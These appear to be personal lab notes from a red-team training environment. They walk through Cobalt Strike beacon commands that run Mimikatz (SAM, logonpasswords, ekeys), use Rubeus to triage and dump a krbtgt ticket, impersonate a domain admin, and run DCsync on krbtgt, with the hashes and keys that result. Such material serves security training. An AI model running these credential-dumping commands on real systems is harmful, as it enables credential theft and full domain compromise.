## Mimikatz
Dumped Mimikatz for tokens to elevate - nothing really usable here just local admin hashes, already system so dont need admin. L
```powershell
beacon> mimikatz token::elevate ; lsadump::sam

ADMINISTRATOR NTLM HASH:
fc525c9683e8fe067095ba2ddc971889
```
![[Pasted image 20230825150150.png]]
Mimikatz to dump logonpasswords and get NTLM hashes
```powershell
beacon> mimikatz !sekurlsa::logonpasswords
Session           : Batch from 0
User Name         : jking
Domain            : DEV
Logon Server      : DC-2
Logon Time        : 8/31/2022 11:49:48 AM
SID               : S-1-5-21-569305411-121244042-2357301523-1105
	msv :
	 [00000003] Primary
	 * Username : jking
	 * Domain   : DEV
	 * NTLM     : 59fc0f884922b4ce376051134c71e22c
	 * SHA1     : 74fa9854d529092b92e0d9ebef7ce3d065027f45
	 * DPAPI    : 0837e40088a674327961e1d03946f5f2
```
![[Pasted image 20230825150804.png]]

## Kerberos Encryption Keys
Grabbing Kerberos Encryption keys
- For me the AES didn't show, it bugged but it's the longest `des_cbc_md4`
```powershell
beacon> mimikatz !sekurlsa::ekeys
```
![[Pasted image 20230825151153.png]]
Manually added AES256 key to Cobalt Strike Credentials
![[Pasted image 20230825151712.png]]
## Extracting Kerberos Tickets using Rubeus
Extracting Luid's from users to pull kerberos TGT's from
```powershell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage

JKING luid: 0x9e0de
BFARMER luid: 0x3c1d2
```
![[Pasted image 20230825153210.png]]
Utilizing jking's luid to extract kerberos TGT
- Base 64 key was too long for entire screenshot
- `/nowrap` is used to display on one line to make copying alot easier.
```powershell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x9e0de /service:krbtgt /nowrap
```
![[Pasted image 20230825153804.png]]
Added the Base64EncodedTicket into CobaltStrike Credential Holder due to inability to copy from vm to host.
![[Pasted image 20230825154129.png]]
## DCsync
Impersonated nlamb a domain administrator
```powershell
beacon> make_token DEV\nlamb F3rrari
```
![[Pasted image 20230825154437.png]]
Utilized DCsync to extract NTLM and AES keys for the krbtgt account.
```powershell
beacon> dcsync dev.cyberbotic.io DEV\krbtgt
# credentials were also added to the Cobalt Strike credentials
Credentials:
  Hash NTLM: 9fb924c244ad44e934c390dc17e02c3d
  aes256_hmac       (4096) : 51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e
```
![[Pasted image 20230825154641.png]]
